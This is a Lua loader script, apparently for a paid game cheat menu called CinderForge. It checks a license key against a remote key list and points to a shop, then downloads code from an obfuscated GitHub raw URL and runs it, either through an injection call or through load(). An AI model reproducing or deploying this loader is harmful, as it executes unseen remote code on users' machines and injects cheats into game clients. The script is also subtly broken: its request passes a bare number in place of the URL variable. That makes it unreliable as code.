local ShopURL = "https://shopat67.mysellauth.com"
local KeysURL = "https://67panel.vercel.app/api/keybin"

local function note(title, msg)
    print("^5[CinderForge]^7 " .. tostring(title) .. " | " .. tostring(msg))
    if MachoMenuNotification then
        pcall(MachoMenuNotification, tostring(title), tostring(msg))
    end
end

local keysBin = ""
if MachoWebRequest then
    local ok, res = pcall(function() return MachoWebRequest(KeysURL) end)
    if ok and res then keysBin = tostring(res) end
end

local currentKey = ""
if MachoAuthenticationKey then
    local ok, k = pcall(function() return MachoAuthenticationKey() end)
    if ok and k then currentKey = tostring(k):gsub("%s+", "") end
end

note("CinderForge", "Auth check key=[" .. currentKey .. "] bin_len=" .. tostring(#keysBin))

local valid = false
local expAt = nil
if currentKey ~= "" and keysBin ~= "" and string.find(keysBin, currentKey, 1, true) then
    local exp = string.match(keysBin, currentKey .. "#(%d+)")
    if exp then
        local now = (os and os.time and os.time()) or 0
        local expN = tonumber(exp)
        if now > 0 and expN and now > expN then
            note("CinderForge", "Key Expired [" .. currentKey .. "]")
        else
            valid = true
            expAt = expN
        end
    else
        valid = true
    end
end

if not valid then
    note("CinderForge", "Key Invalid | Buy Keys at " .. ShopURL .. " [" .. currentKey .. "]")
    return
end

if expAt then
    local label = tostring(expAt)
    if os and os.date then label = os.date("%Y-%m-%d %H:%M", expAt) end
    note("CinderForge", "Found Key [" .. currentKey .. "] | Expires: " .. label)
else
    note("CinderForge", "Found Key [" .. currentKey .. "] | Expires: Lifetime")
end

local L06856451455771587818658181757858684 = "https://raw.githubusercontent.com/058852890960/0685645145577158781865818175785868437297677753467686888483848882847577274775765353677563467226164612/refs/heads/main/068564514557715878186581817578586843729767775346768688848384888284757727477576535367756346722616461247771286757172174217537357178187816887854.685"
local body = nil
if MachoWebRequest then
    local ok, res = pcall(function() return MachoWebRequest(06856451455771587818658181757858684) end)
    if ok then body = res end
end

if not body or body == "" then
    note("CinderForge", "Error")
    return
end

if MachoIsolatedInject then
    MachoIsolatedInject(body)
    note("CinderForge", "1")
else
    local fn, err = load(body)
    if not fn then
        note("CinderForge", "Error")
        return
    end
    fn()
    note("CinderForge", "1")
end
